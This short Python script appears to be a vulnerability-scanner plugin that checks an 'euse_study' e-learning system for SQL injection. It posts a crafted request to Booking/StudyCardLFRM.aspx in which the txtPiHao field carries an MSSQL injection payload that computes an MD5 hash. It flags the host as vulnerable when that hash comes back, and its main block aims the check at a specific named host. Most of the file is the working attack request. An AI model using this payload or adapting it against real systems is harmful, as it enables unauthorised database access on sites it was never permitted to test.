#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:xq17

def assign(service,arg):
    if service=="euse_study":
        return True,arg 
    
def audit(arg):
    url = "Booking/StudyCardLFRM.aspx"
    data = """__VIEWSTATE=wWYWBEx%2BQMECph0D8%2FNJ5wyqsuLYJDgEQZodQT8bVYPKol481KtYtB7vab9TovDUzS2PXmfLYeFJbZHcCvVHNvtq2bmoHusa39XClLFKwlbO9ZzM9npgpZTRNo5I5EQXb4cELxoHMIAMiRZG9h6jV3%2B6mSp77Q0xuymC2%2FExEk%2Fn68zIqiySNIs7MBuQe3juEB8yoGwlgg1eX4RYBi9Oirj7m4xidFMt0RAibI64b4jDcB7LD%2BqQfxRlwJ3YBWyxfxodS6OuHSPXkO2rFPrjvU0FIhUyIulE9L9GDEUrpCsR52XO&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=9sx9B3ECeCL1lfNL3nST9EDKxE3Aj68kA947BGsZzu2bmJfixmQANjHtZH%2FD3MtTjBW5M0y7cKb7XcCiW0XTEuU6ZFjyQYov00fuu2eALkZsuH8LVf3E8B108ViMwifpBFtR07gkmG4J9%2BIEJ%2FhFP9VQQ4DGE3ZfmyxZOhIhdWzsQ1h8&txtCardNo=1&txtPiHao=1'and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--&ddlState=1&ddlUse=&btnSearch=%E6%9F%A5%E8%AF%A2"""
    vul = arg + url
    code, head, res, errcode, _ = curl.curl2(vul,data)
    if code!=0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(arg + url)

if __name__=="__main__":
    from dummy import *
    audit(assign('euse_study','http://elearning.chang-de.com:6088/')[1])